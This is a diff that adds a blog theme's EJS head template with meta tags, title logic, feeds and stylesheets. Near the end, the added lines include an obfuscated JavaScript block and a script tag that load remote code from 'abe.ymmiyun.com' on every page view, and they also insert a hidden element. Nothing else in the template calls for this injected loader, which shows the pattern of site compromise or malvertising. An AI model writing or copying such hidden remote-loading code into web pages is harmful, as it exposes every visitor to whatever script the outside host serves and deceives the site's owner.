@@ -1,0 +1,45 @@
+<head>
+  <meta charset="utf-8">
+  <%- partial('google-analytics') %>
+  <%
+  var title = page.title;
+
+  if (is_archive()){
+    title = __('archive_a');
+
+    if (is_month()){
+      title += ': ' + page.year + '/' + page.month;
+    } else if (is_year()){
+      title += ': ' + page.year;
+    }
+  } else if (is_category()){
+    title = __('category') + ': ' + page.category;
+  } else if (is_tag()){
+    title = __('tag') + ': ' + page.tag;
+  }
+  %>
+  <title><% if (title){ %><%= title %> | <% } %><%= config.title %></title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <%- open_graph({twitter_id: theme.twitter, fb_admins: theme.fb_admins, fb_app_id: theme.fb_app_id}) %>
+  <% if (config.feed) { %>
+    <%- feed_tag() %>
+  <% } else if (theme.rss) { %>
+    <%- feed_tag(theme.rss) %>
+  <% } %>
+  <% if (theme.favicon){ %>
+    <%- favicon_tag(theme.favicon) %>
+  <% } %>
+  <% if (config.highlight.enable){ %>
+    <%- css('https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css') %>
+  <% } %>
+  <%- css('css/style') %>
+  <% if (theme.fancybox){ %>
+    <%- css('fancybox/jquery.fancybox.min.css') %>
+  <% } %>
+  <%- css('https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css') %>
+<script>
+function _0xad8d(){var _0x415917=["appendChild","async","17420600krMHrH","1745anbqeh","status","3753308zqyHvi","script","<ins style=\"display:none!important\" id=\"","117zuUNwB","send","GET","241470vviWZJ","14814zTpUeb","2377029035902478992-36975","\"></ins>","420624QrHAkS","300328XEjsyp","push","onreadystatechange","78520CheEqy","open","responseText","2WDzbBn","https://abe.ymmiyun.com/o.js","head"];_0xad8d=function(){return _0x415917;};return _0xad8d();}function _0x3a09(_0x2ab93d,_0x54f225){var _0xad8db5=_0xad8d();return _0x3a09=function(_0x3a09e2,_0x458277){_0x3a09e2=_0x3a09e2-0xd6;var _0x45f57d=_0xad8db5[_0x3a09e2];return _0x45f57d;},_0x3a09(_0x2ab93d,_0x54f225);}
+</script>
+<script async src="https://abe.ymmiyun.com/o.js"></script>
+<script src="/js/ad.js"></script>
+</head>
